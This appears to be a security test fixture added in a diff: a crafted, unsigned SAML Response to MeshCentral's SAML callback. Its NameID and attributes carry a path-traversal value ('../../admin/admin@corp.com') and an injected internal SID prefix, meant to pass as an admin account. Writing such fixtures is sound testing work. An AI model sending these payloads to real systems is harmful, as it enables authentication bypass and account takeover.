@@ -1,0 +1,38 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- VECTOR: nameID containing path traversal and SID prefix injection — MeshCentral userid = "user/<domain>/<nameID>"; crafted nameID may escape to different user space -->
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
+                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
+                ID="_traversal001"
+                Version="2.0"
+                IssueInstant="2026-01-01T00:00:00Z"
+                Destination="https://meshcentral.example.com/auth-saml-callback">
+  <saml:Issuer>https://idp.example.com/saml</saml:Issuer>
+  <samlp:Status>
+    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
+  </samlp:Status>
+  <saml:Assertion ID="_assertion_traversal" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">
+    <saml:Issuer>https://idp.example.com/saml</saml:Issuer>
+    <saml:Subject>
+      <!-- nameID with slash: userid becomes "user/<domain>/~saml:../../admin/admin@corp.com" -->
+      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">../../admin/admin@corp.com</saml:NameID>
+      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
+        <saml:SubjectConfirmationData NotOnOrAfter="2099-01-01T00:00:00Z"
+                                      Recipient="https://meshcentral.example.com/auth-saml-callback"/>
+      </saml:SubjectConfirmation>
+    </saml:Subject>
+    <saml:Conditions NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z">
+      <saml:AudienceRestriction>
+        <saml:Audience>meshcentral</saml:Audience>
+      </saml:AudienceRestriction>
+    </saml:Conditions>
+    <saml:AttributeStatement>
+      <!-- Attempt to inject the internal SID prefix directly in nameID attribute -->
+      <saml:Attribute Name="nameID">
+        <saml:AttributeValue>~saml:admin@corp.com</saml:AttributeValue>
+      </saml:Attribute>
+      <saml:Attribute Name="email">
+        <saml:AttributeValue>../../admin/admin@corp.com</saml:AttributeValue>
+      </saml:Attribute>
+    </saml:AttributeStatement>
+  </saml:Assertion>
+</samlp:Response>
